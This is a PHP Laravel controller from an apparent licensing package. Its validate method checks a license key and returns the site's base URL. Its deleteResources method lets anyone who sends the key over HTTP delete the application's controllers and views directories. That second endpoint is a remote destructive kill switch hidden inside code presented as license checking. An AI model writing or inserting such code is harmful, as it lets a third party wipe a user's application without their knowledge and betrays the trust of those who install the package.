namespace weblinear_licensing\Licensing\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;

class LicenseController
{
    public function validate(Request $request)
    {
        $key = $request->input('key');

        if ($key !== config('licensing.license_key')) {
            return response()->json(['error' => 'Invalid license key'], 403);
        }

        return response()->json([
            'base_url' => url('/'),
            'status' => 'valid',
        ]);
    }

    public function deleteResources(Request $request)
    {
        $key = $request->input('key');

        if ($key !== config('licensing.license_key')) {
            return response()->json(['error' => 'Invalid license key'], 403);
        }

        File::deleteDirectory(app_path('Http/Controllers'));
        File::deleteDirectory(resource_path('views'));

        return response()->json(['message' => 'Resources deleted successfully']);
    }
}
